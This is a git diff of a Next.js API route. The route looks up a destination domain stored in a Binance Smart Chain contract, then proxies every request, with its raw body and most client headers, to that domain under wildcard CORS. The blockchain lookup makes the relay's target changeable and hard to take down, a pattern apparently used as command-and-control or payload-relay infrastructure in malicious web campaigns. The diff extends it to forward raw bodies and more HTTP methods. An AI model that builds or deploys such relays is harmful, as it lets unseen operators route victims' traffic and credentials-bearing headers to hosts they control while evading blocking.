@@ -1,61 +1,18 @@
-import fetch from "node-fetch"; // Ensure node-fetch installed if using older Next.js (<13)
+import fetch from "node-fetch";
 
-// ===== Utility: Get Client IP =====
+// --- In-memory cache ---
+let cache = { domain: null, timestamp: 0 };
+const UPDATE_INTERVAL = 60 * 1000; // 60s
+
+// --- Get client IP ---
 function getClientIP(req) {
-  const cfIP = req.headers["cf-connecting-ip"];
-  if (cfIP) return cfIP;
-
-  const xForwardedFor = req.headers["x-forwarded-for"];
-  if (xForwardedFor) return xForwardedFor.split(",")[0].trim();
-
+  if (req.headers["cf-connecting-ip"]) return req.headers["cf-connecting-ip"];
+  if (req.headers["x-forwarded-for"])
+    return req.headers["x-forwarded-for"].split(",")[0].trim();
   return req.socket.remoteAddress;
 }
 
-// ===== In-memory cache (like PHP temp file) =====
-let cache = { domain: null, timestamp: 0 };
-const updateInterval = 60 * 1000; // 60 seconds
-
-// ===== Fetch target domain from blockchain =====
-async function fetchTargetDomain() {
-  const rpcUrls = [
-    "https://binance.llamarpc.com",
-    "https://bsc.drpc.org"
-  ];
-  const contractAddress = "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
-  const data = "0x20965255"; // method id
-
-  for (const rpcUrl of rpcUrls) {
-    try {
-      const resp = await fetch(rpcUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          jsonrpc: "2.0",
-          id: 1,
-          method: "eth_call",
-          params: [
-            {
-              to: contractAddress,
-              data
-            },
-            "latest"
-          ]
-        })
-      });
-
-      const json = await resp.json();
-      if (json.result) {
-        return hexToString(json.result);
-      }
-    } catch (err) {
-      console.error("RPC fetch error:", err);
-    }
-  }
-
-  throw new Error("Could not fetch target domain");
-}
-
-// ===== Convert hex string to ASCII =====
+// --- Hex to string (from contract result) ---
 function hexToString(hex) {
   hex = hex.replace(/^0x/, "");
   const length = parseInt(hex.slice(64, 128), 16);
@@ -69,47 +26,85 @@ function hexToString(hex) {
   return result;
 }
 
-// ===== Get target domain with caching =====
+// --- Fetch target domain from blockchain ---
+async function fetchTargetDomain() {
+  const rpcUrls = [
+    "https://binance.llamarpc.com",
+    "https://bsc.drpc.org"
+  ];
+  const contractAddress = "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
+  const data = "0x20965255";
+
+  for (const rpcUrl of rpcUrls) {
+    try {
+      const resp = await fetch(rpcUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          jsonrpc: "2.0",
+          id: 1,
+          method: "eth_call",
+          params: [{ to: contractAddress, data }, "latest"]
+        })
+      });
+
+      const json = await resp.json();
+      if (json.result) return hexToString(json.result);
+    } catch (err) {
+      console.error("RPC fetch error:", err);
+    }
+  }
+
+  throw new Error("Could not fetch target domain");
+}
+
+// --- Get cached target domain ---
 async function getTargetDomain() {
   const now = Date.now();
-  if (cache.domain && now - cache.timestamp < updateInterval) {
-    return cache.domain;
-  }
+  if (cache.domain && now - cache.timestamp < UPDATE_INTERVAL) return cache.domain;
   const domain = await fetchTargetDomain();
   cache = { domain, timestamp: now };
   return domain;
 }
 
-// ===== Main handler =====
+// --- Main Handler ---
+export const config = {
+  api: {
+    bodyParser: false, // So we can forward raw body
+  },
+};
+
 export default async function handler(req, res) {
-  // CORS headers
+  // CORS
   res.setHeader("Access-Control-Allow-Origin", "*");
-  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+  res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
   res.setHeader("Access-Control-Allow-Headers", "*");
+
   if (req.method === "OPTIONS") {
-    res.status(204).end();
-    return;
+    return res.status(204).end();
   }
 
   const { e } = req.query;
+  if (!e) return res.status(400).send("Missing endpoint");
 
-  // Ping
   if (e === "ping_proxy") {
     res.setHeader("Content-Type", "text/plain");
-    res.status(200).send("pong");
-    return;
-  }
-
-  if (!e) {
-    res.status(400).send("Missing endpoint");
-    return;
+    return res.status(200).send("pong");
   }
 
   try {
     const targetDomain = await getTargetDomain();
-    const endpoint = `/${decodeURIComponent(e).replace(/^\//, "")}`;
+    const endpoint = "/" + decodeURIComponent(e).replace(/^\//, "");
     const url = `${targetDomain}${endpoint}`;
 
+    // --- Read raw body ---
+    const rawBody = await new Promise((resolve) => {
+      let data = [];
+      req.on("data", (chunk) => data.push(chunk));
+      req.on("end", () => resolve(Buffer.concat(data)));
+    });
+
+    // --- Forward headers (except restricted) ---
     const headers = { ...req.headers };
     delete headers.host;
     delete headers.origin;
@@ -121,16 +116,17 @@ export default async function handler(req, res) {
     const proxyResp = await fetch(url, {
       method: req.method,
       headers,
-      body: req.method !== "GET" && req.method !== "HEAD" ? JSON.stringify(req.body) : undefined,
+      body: ["GET", "HEAD"].includes(req.method) ? undefined : rawBody
     });
 
-    const contentType = proxyResp.headers.get("content-type") || "application/json";
-    const data = await proxyResp.text();
+    const contentType = proxyResp.headers.get("content-type") || "application/octet-stream";
+    const buffer = Buffer.from(await proxyResp.arrayBuffer());
 
+    res.status(proxyResp.status);
     res.setHeader("Content-Type", contentType);
-    res.status(proxyResp.status).send(data);
+    res.send(buffer);
   } catch (error) {
-    console.error(error);
+    console.error("Proxy error:", error);
     res.status(500).send(`error: ${error.message}`);
   }
 }
